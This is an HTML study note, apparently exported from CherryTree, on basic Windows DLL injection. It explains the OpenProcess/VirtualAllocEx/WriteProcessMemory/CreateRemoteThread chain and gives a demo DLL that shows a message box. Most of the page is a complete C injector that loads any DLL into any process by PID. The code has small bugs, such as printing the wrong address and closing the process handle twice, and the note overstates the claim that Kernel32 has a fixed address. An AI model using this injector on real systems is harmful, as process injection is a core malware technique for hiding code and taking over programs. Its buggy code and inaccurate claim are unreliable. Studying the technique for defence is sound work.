<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>Basic DLL Injection</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
</head>
<body>
<div class='page'><strong><h1># Basic DLL Injection</h1></strong><br />• <a href="http://blog.opensecurityresearch.com/2013/01/windows-dll-injection-basics.html">http://blog.opensecurityresearch.com/2013/01/windows-dll-injection-basics.html</a><br />• <a href="https://www.ired.team/offensive-security/code-injection-process-injection/dll-injection">https://www.ired.team/offensive-security/code-injection-process-injection/dll-injection</a><br /><br />This is the most basic form of DLL injection:<br />• you open a handle to the target - <code>OpenProcess</code><br />• allocate memory in the target - <code>VirtualAllocEx</code><br />• write the path of the DLL you want to inject into the target - <code>WriteProcessMemory</code><br />• call <code>LoadLibraryA</code> in the target process with your DLL path to load your DLL into the target<br /><br />This works because the <code>LoadLibraryA</code> function exists at the same location in every process.<br />• <code>LoadLibraryA</code> lives in <code>Kernel32.dll</code><br />• <code>Kernel32.dll</code> is loaded into every running process<br />• <code>Kernel32.dll</code> lives at the same location in every process:<br />   ◇ <code>0x753b0000</code> on 32bit<br />   ◇ <code>0x7ff9cfe10000</code> on 64bit<br />   ◇ (you can verify this yourself with Process Hacker and checking the <em>Modules</em> tab)<br />• Therefore, we can simply grab the address of LoadLibraryA in our own process<br />   ◇ and it will be the same address for every other running process on the system.<br /><br /><strong>Downsides</strong><br />• <code>LoadLibraryA</code> registers the injected DLL with the target, which makes for easy detection of the injected DLL<br />• <code>LoadLibraryA</code> will only load a DLL once. You can&#39;t repeatedly inject into the process with the same DLL<br /><br /><strong>Variations</strong><br />The variations to this technqiue are simply how you execute <code>LoadLibraryA</code> in the target process.<br />You can use:<br />• <code>CreateRemoteThread</code> (used here)<br />• <code>NtCreateThreadEx</code><br />• <code>QueueUserAPC</code><br />• <code>RtlCreateUserThread</code><br /><br />Lots of examples here:<br />• <a href="https://github.com/fdiskyou/injectAllTheThings">https://github.com/fdiskyou/injectAllTheThings</a><br />• <a href="https://github.com/fdiskyou/injectAllTheThings/tree/master/injectAllTheThings">https://github.com/fdiskyou/injectAllTheThings/tree/master/injectAllTheThings</a><br /><br /><strong><h2>## Demo</h2></strong><br />The DLL I&#39;ve injected is this:<br /><div class="codebox"><div class="codebox">#include&nbsp;&lt;Windows.h&gt;<br /><br />void&nbsp;Hello(void)<br />{<br />&nbsp;&nbsp;&nbsp;&nbsp;MessageBoxA(NULL,&nbsp;&quot;hey!&nbsp;i&#39;m&nbsp;a&nbsp;DLL.&nbsp;i&#39;ve&nbsp;been&nbsp;attached&nbsp;:)&quot;,&nbsp;&quot;smile&quot;,&nbsp;MB_OK);<br />&nbsp;&nbsp;&nbsp;&nbsp;return;<br />}<br /><br />BOOL&nbsp;WINAPI&nbsp;DllMain(HINSTANCE&nbsp;hinstDLL,&nbsp;DWORD&nbsp;fdwReason,&nbsp;LPVOID&nbsp;lpReserved)<br /><span style="color:#000000;font-weight:400">{</span><br />&nbsp;&nbsp;&nbsp;&nbsp;switch&nbsp;(fdwReason)<br />&nbsp;&nbsp;&nbsp;&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;case&nbsp;DLL_PROCESS_ATTACH:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Hello();<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;<br />&nbsp;&nbsp;&nbsp;&nbsp;case&nbsp;DLL_THREAD_ATTACH:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;<br />&nbsp;&nbsp;&nbsp;&nbsp;case&nbsp;DLL_THREAD_DETACH:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;<br />&nbsp;&nbsp;&nbsp;&nbsp;case&nbsp;DLL_PROCESS_DETACH:<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;break;<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;return&nbsp;TRUE;<br /><span style="color:#000000;font-weight:400">}</span></div></div><br /><br />I&#39;m injecting into <code>notepad.exe</code><br />Notepad&#39;s PID is <code>14124</code> (seen in Process Hacker).<br />In the screenshot below we can see that I&#39;ve injected into <code>notepad.exe</code>, and that notepad now has 2 windows -  one is the notepad window and the other is our injected DLL&#39;s window that says hello.<br /><br />I ran PowerShell as Administrator to just make sure my DLL injector had Administrator privileges and gain full access to notepad.exe and write into it.<br /><a href=""><img src="images/1645-1.png" alt="images/1645-1.png" /></a><br /><br /><strong><h2>## Code</h2></strong><br /><div class="codebox"><div class="codebox">#include&nbsp;&lt;stdio.h&gt;<br />#include&nbsp;&lt;Windows.h&gt;<br /><br />int&nbsp;main(int&nbsp;argc,&nbsp;char*&nbsp;argv[])<br /><span style="color:#000000;font-weight:400">{</span><br />	BOOL&nbsp;b_ret&nbsp;=&nbsp;TRUE;<br />	LPVOID&nbsp;LoadLibraryA_address&nbsp;=&nbsp;NULL;<br />	char*&nbsp;dll_path&nbsp;=&nbsp;NULL;<br />	SIZE_T&nbsp;dll_path_len&nbsp;=&nbsp;0;<br />	int&nbsp;target_pid&nbsp;=&nbsp;0;<br />	HANDLE&nbsp;h_target&nbsp;=&nbsp;NULL;<br />	HANDLE&nbsp;h_target_thread&nbsp;=&nbsp;NULL;<br />	LPVOID&nbsp;target_memory&nbsp;=&nbsp;NULL;<br />	<br />	printf(&quot;#&nbsp;dll&nbsp;injector&nbsp;\n&quot;);<br />	printf(&quot;-&nbsp;Writes&nbsp;DLL&nbsp;path&nbsp;into&nbsp;target&nbsp;and&nbsp;calls&nbsp;LoadLibraryA&nbsp;\n&quot;);<br />	printf(&quot;-&nbsp;advise&nbsp;running&nbsp;as&nbsp;Adminstrator&nbsp;\n&quot;);<br />	printf(&quot;\n&quot;);<br />	<br />	if&nbsp;(argc&nbsp;!=&nbsp;3)<br />	{<br />		printf(&quot;[-]&nbsp;not&nbsp;enough&nbsp;arguments&nbsp;:/&nbsp;\n&quot;);<br />		printf(&quot;usage:&nbsp;dll_injector.exe&nbsp;[target&nbsp;pid]&nbsp;[dll&nbsp;path]&nbsp;\n&quot;);<br />		return&nbsp;EXIT_FAILURE;<br />	}<br />	<br />	target_pid&nbsp;=&nbsp;atoi(argv[1]);<br />	dll_path&nbsp;=&nbsp;argv[2];<br />	dll_path_len&nbsp;=&nbsp;strlen(dll_path);<br /><br />	printf(&quot;[*]&nbsp;target&nbsp;process:&nbsp;%d&nbsp;\n&quot;,&nbsp;target_pid);<br />	printf(&quot;[*]&nbsp;dll&nbsp;to&nbsp;inject:&nbsp;%s&nbsp;\n&quot;,&nbsp;dll_path);<br />	printf(&quot;[*]&nbsp;dll&nbsp;path&nbsp;len:&nbsp;%lld&nbsp;\n&quot;,&nbsp;dll_path_len);<br /><br />	//&nbsp;open&nbsp;handle&nbsp;to&nbsp;target&nbsp;process<br />	h_target&nbsp;=&nbsp;OpenProcess(PROCESS_ALL_ACCESS,&nbsp;FALSE,&nbsp;target_pid);<br />	if&nbsp;(h_target&nbsp;==&nbsp;NULL)<br />	{<br />		printf(&quot;[-]&nbsp;failed&nbsp;to&nbsp;open&nbsp;handle&nbsp;to&nbsp;target&nbsp;process:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />		goto&nbsp;cleanup;<br />	}<br />	else<br />		printf(&quot;[+]&nbsp;opened&nbsp;handle&nbsp;to&nbsp;target&nbsp;process&nbsp;\n&quot;);<br /><br />	//&nbsp;allocate&nbsp;space&nbsp;for&nbsp;DLL&nbsp;path&nbsp;in&nbsp;target<br />	target_memory&nbsp;=&nbsp;VirtualAllocEx(h_target,&nbsp;NULL,&nbsp;dll_path_len,&nbsp;MEM_COMMIT&nbsp;|&nbsp;MEM_RESERVE,&nbsp;PAGE_READWRITE);<br />	if&nbsp;(target_memory&nbsp;==&nbsp;NULL)<br />	{<br />		printf(&quot;[-]&nbsp;failed&nbsp;to&nbsp;allocate&nbsp;memory&nbsp;in&nbsp;target&nbsp;process:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />		goto&nbsp;cleanup;<br />	}<br />	else<br />		printf(&quot;[+]&nbsp;allocated&nbsp;memory&nbsp;in&nbsp;target&nbsp;@&nbsp;0x%p&nbsp;\n&quot;,&nbsp;target_memory);<br /><br />	//&nbsp;write&nbsp;DLL&nbsp;path&nbsp;into&nbsp;target<br />	b_ret&nbsp;=&nbsp;WriteProcessMemory(h_target,&nbsp;target_memory,&nbsp;(LPVOID)dll_path,&nbsp;dll_path_len,&nbsp;NULL);<br />	if&nbsp;(b_ret&nbsp;==&nbsp;FALSE)<br />	{<br />		printf(&quot;[-]&nbsp;failed&nbsp;to&nbsp;write&nbsp;DLL&nbsp;path&nbsp;into&nbsp;target:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />		VirtualFreeEx(h_target,&nbsp;target_memory,&nbsp;dll_path_len,&nbsp;MEM_RELEASE);<br />		goto&nbsp;cleanup;<br />	}<br />	else<br />		printf(&quot;[+]&nbsp;dll&nbsp;path&nbsp;written&nbsp;to&nbsp;0x%p&nbsp;\n&quot;,&nbsp;target_memory);<br /><br />	//&nbsp;grab&nbsp;address&nbsp;of&nbsp;LoadLibraryA<br />	/*<br />	The&nbsp;LoadLibraryA&nbsp;function&nbsp;exists&nbsp;in&nbsp;Kernel32.dll<br />	Kernel32.dll&nbsp;is&nbsp;loaded&nbsp;into&nbsp;every&nbsp;running&nbsp;process<br />	Kernel32.dll&nbsp;lives&nbsp;at&nbsp;the&nbsp;same&nbsp;location&nbsp;in&nbsp;every&nbsp;process:<br />	-&nbsp;0x753b0000&nbsp;on&nbsp;32bit<br />	-&nbsp;0x7ff9cfe10000&nbsp;on&nbsp;64bit<br /><br />	Therefore,&nbsp;we&nbsp;can&nbsp;simply&nbsp;grab&nbsp;the&nbsp;address&nbsp;of&nbsp;LoadLibraryA&nbsp;in&nbsp;our&nbsp;own&nbsp;process,&nbsp;<br />	and&nbsp;it&nbsp;will&nbsp;be&nbsp;the&nbsp;same&nbsp;address&nbsp;for&nbsp;every&nbsp;other&nbsp;running&nbsp;process&nbsp;on&nbsp;the&nbsp;system.<br />	*/<br />	LoadLibraryA_address&nbsp;=&nbsp;(LPVOID)GetProcAddress(GetModuleHandleA(&quot;Kernel32.dll&quot;),&nbsp;&quot;LoadLibraryA&quot;);<br />	printf(&quot;[+]&nbsp;LoadLibraryA&nbsp;@&nbsp;0x%p&nbsp;\n&quot;,&nbsp;LoadLibraryA);<br /><br />	//&nbsp;create&nbsp;thread&nbsp;in&nbsp;target&nbsp;process&nbsp;to&nbsp;execute&nbsp;LoadLibraryA&nbsp;and&nbsp;load&nbsp;our&nbsp;DLL<br />	h_target_thread&nbsp;=&nbsp;CreateRemoteThread(h_target,&nbsp;NULL,&nbsp;0,&nbsp;(LPTHREAD_START_ROUTINE)LoadLibraryA_address,&nbsp;target_memory,&nbsp;0,&nbsp;NULL);<br />	if&nbsp;(h_target_thread&nbsp;==&nbsp;NULL)<br />	{<br />		printf(&quot;[-]&nbsp;failed&nbsp;to&nbsp;create&nbsp;thread&nbsp;in&nbsp;target&nbsp;process:&nbsp;%d&nbsp;\n&quot;,&nbsp;GetLastError());<br />		VirtualFreeEx(h_target,&nbsp;target_memory,&nbsp;dll_path_len,&nbsp;MEM_RELEASE);<br />		goto&nbsp;cleanup;<br />	}<br />	else<br />		printf(&quot;[+]&nbsp;LoadLibraryA&nbsp;called&nbsp;in&nbsp;target!&nbsp;your&nbsp;DLL&nbsp;is&nbsp;being&nbsp;loaded...&nbsp;\n&quot;);<br /><br />cleanup:<br />	if&nbsp;(h_target)&nbsp;CloseHandle(h_target);<br />	if&nbsp;(h_target_thread)&nbsp;CloseHandle(h_target);<br /><br />	return&nbsp;0;<br /><span style="color:#000000;font-weight:400">}</span></div></div><br /><br /><br /></div>
</body>
</html>
